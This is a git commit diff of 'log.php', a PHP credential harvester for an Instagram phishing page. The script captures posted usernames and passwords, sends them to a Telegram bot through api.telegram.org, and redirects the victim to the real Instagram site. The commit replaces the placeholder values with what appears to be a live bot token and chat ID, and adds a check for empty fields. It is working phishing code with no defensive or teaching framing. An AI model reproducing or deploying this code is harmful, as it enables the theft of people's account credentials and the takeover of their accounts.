fe1b55dd978477d1a90c395eae277d3ef20280dc
jojavi443 <jojavi443@gmail.com>
2025-05-15 13:45:14 +0100

    Update log.php

--- log.php
+++ log.php
@@ -1,13 +1,18 @@
 <?php
-$token = "YOUR_BOT_TOKEN";
-$chat_id = "YOUR_CHAT_ID";
+// Replace with your bot token and chat ID
+$botToken = "7889306667:AAEaMJi5oyXLhRyl3dew-0tU_Re9k7V-0xo";
+$chatId = "7047340294";
+
 $username = $_POST['username'];
 $password = $_POST['password'];
 
-$txt = "Instagram Login:\nUsername: $username\nPassword: $password";
-$sendToTelegram = fopen("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=".urlencode($txt),"r");
-
-// Redirect to real Instagram
-header("Location: https://instagram.com");
-exit;
+if (!empty($username) && !empty($password)) {
+    $message = "Instagram Login Attempt:\nUsername: $username\nPassword: $password";
+    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
+    file_get_contents($url);
+    header("Location: https://instagram.com");
+    exit();
+} else {
+    echo "Invalid login. Try again.";
+}
 ?>
